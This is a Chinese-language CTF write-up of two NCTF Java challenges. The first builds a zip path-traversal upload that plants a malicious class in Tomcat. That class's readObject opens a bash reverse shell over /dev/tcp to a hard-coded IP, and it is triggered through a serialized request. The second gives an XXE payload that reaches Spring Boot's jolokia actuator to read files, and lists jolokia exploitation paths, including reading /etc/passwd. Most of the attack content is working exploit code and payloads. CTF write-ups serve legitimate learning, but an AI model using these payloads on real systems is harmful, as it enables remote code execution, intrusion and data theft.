# NCTF_JAVA

>有时间做了一下NCTF的java题，感觉不错记录一下

## Ezjava
考察点：解压路径穿越写文件rce

>tomcat 路径 /usr/local/tomcat 上传的路径 /tmp/fileUpload/

通过写evil.class 然后重写readobject去rce

```
 /tmp/fileUpload/../../../usr/local/tomcat/webapps/html/WEB-INF/classes/com/x1c/nctf/controller/evil.class
```
```
../../usr/local/tomcat/webapps/html/WEB-INF/classes/com/x1c/nctf/controller/evil.class
```

```java
package com.x1c.nctf.controller;

import java.io.*;

public class evil implements Serializable {
    public evil() {    }
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException, InterruptedException {
        try{
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/101.35.195.134/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        }catch (IOException e){
            try{
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
            }catch (IOException ee){
            }
        }
    }

    public static void main(String[] args) throws Exception {
        evil evil = new evil();
        writeObjectToFile(evil,"1.txt");

    }
    public static void writeObjectToFile(Object obj,String fileName) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(fileName));
        outputStream.writeObject(obj);
        outputStream.close();
    }
}

```
压缩包制作
```python
# -*- coding: utf-8 -*
# /usr/bin/python3
# @Author:Firebasky
import zipfile
file_name="evil.class"
f = zipfile.ZipFile('exp.zip','w',zipfile.ZIP_STORED)
f.write(file_name,'../../usr/local/tomcat/webapps/html/WEB-INF/classes/com/x1c/nctf/controller/evil.class')
f.close()
```

```
GET /html/backdoor?cmd=rO0ABXNyABxjb20ueDFjLm5jdGYuY29udHJvbGxlci5ldmlsfJBBr%2bZElI4CAAB4cA%3d%3d HTTP/1.1
Host: 129.211.173.64:8081
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://129.211.173.64:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://129.211.173.64:8081/html/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

## api_system

>这个题，刚刚好拿来学习api,之前学习过springboot的利用思路。并且看到了知识星球的api学习。
>自己一直卡在了绕过/actuator/jolokia/权限的问题，结果通过xxe去绕过。。。

通过[APIKit工具](https://github.com/API-Security/APIKit)去扫描,存在/user/list接口测试发现存在xxe，之后就通过xxe打内网/actuator/jolokia/去绕过

tips：内网端口通过/env去查看


之后就通过/actuator/jolokia/接口的读文件去读flag.


```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "http://127.0.0.1:8080/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/flag">
]>
<id>&f;</id>
```


[jolokia-exploitation-toolkit](https://github.com/laluka/jolokia-exploitation-toolkit)

```
jolokia/
jolokia/list
jolokia?p=/read/jboss.jmx:alias=jmx%2Frmi%2FRMIAdaptor/State
jolokia/exec/java.lang:type=Memory/gc
jolokia/list?maxObjects=100
jolokia/read/java.lang:type=*/HeapMemoryUsage
jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
jolokia/search/*:j2eeType=J2EEServer,*
jolokia/write/java.lang:type=Memory/Verbose/true
jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
```


